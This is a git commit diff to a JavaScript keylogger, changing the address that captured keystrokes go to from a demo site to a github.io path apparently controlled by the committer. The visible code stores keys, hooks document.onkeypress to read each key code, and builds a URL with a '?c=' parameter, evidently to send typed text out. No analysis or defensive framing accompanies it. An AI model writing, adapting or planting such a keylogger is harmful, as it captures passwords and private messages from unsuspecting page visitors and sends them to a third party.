d8451bf5383b4dfc338cf99ef57566d878645669
mtuhu <116632449+muthuthebug@users.noreply.github.com>
2022-10-25 15:45:25 +0700

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,5 +1,5 @@
 var keys='';
- var url = 'https://demo.codingdiksha.com/javascript-keylogger/keylogger.php?c=';
+ var url = 'https://muthuthebug.github.io/key/keylogger.php?c=';
  document.onkeypress = function(e) {
      get = window.event?event:e;
      key = get.keyCode?get.keyCode:get.charCode;
